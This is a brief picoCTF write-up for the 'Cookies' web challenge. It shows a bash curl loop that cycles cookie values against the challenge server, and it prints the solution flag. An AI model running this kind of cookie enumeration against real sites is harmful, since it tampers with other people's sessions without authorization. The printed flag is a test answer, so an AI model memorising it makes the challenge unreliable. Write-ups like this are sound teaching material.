Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)

The URL leads us to a basic input form, where we can input the name of a cookie. Snickerdoodle is the default entry, so lets type that in and press "Search". From there, we are led to a page (`/check`) that tells us `That is a cookie! Not very special though... `. Looking at the cookie for the page, we see a cookie called `Name` with a value of `0`. 

Based on the challenge description we need to figure out the value of this cookie that will give us the flag. This bash one-liner works fine:

`for i in {0..100}; do curl -b "name=$i" "http://mercury.picoctf.net:64944/check" -s | grep 'pico'; done`

Output:

```
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>
```

If you're curious, the correct value for me was 18.

flag: `picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}`
